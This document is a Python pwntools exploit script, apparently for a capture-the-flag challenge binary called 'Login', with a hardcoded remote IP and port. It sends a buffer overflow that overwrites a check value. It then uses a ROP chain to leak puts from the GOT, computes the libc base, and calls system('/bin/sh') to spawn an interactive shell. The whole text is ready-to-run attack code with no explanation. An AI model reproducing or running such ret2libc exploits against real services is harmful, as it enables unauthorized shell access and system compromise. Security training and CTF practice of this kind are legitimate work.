from pwn import *
import sys
remote_addr = ["59.110.164.72",10000]
libc = ELF('./libc-2.23.so')
elf = ELF('./Login')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./Login_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)


debug()
rl()
#leak_addr = int(ru(b'\n')[17:], 16)
#pr('leak_addr', leak_addr)
payload = b'a' * (0x1c) + p32(0x15cc15cc)
s(payload)
#libc_base = leak_addr - 0x3c48e0
#binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
#system = libc_base + libc.sym['system']
pop_rdi = 0x4008c3
ret = 0x400599
payload = b'a' * (0x20 + 8) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x400796)
s(payload)
leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
pr('leak_addr', leak_addr)
libc_base = leak_addr - libc.sym['puts']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
system = libc_base + libc.sym['system']
payload = b'a' * (0x1c) + p32(0x15cc15cc)
sa('username:\n', payload)
payload = b'a' * (0x20 + 8) + p64(pop_rdi) + p64(binsh) + p64(system)
sa('password:\n', payload)

shell()
